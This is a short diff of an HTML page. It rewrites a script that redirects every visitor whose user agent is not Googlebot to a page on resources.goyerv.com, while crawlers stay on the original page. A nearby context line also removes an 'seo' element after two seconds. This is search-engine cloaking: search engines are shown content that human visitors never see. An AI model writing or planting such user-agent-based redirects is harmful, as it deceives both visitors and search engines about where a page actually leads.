@@ -77,11 +77,12 @@
       if (seo) seo.remove();
     }, 2000);
   </script>
-</body>
-<script>
+  <script>
   if (!navigator.userAgent.includes('Googlebot')) {
-    const fullPath = window.location.pathname;
-    window.location.href = `https://bulletin.goyerv.com${fullPath}`;
+    let fullPath = window.location.pathname;
+    fullPath = fullPath.replace(/\.html$/, '');
+    window.location.href = `https://resources.goyerv.com${fullPath}`;
   }
 </script>
+</body>
 </html>
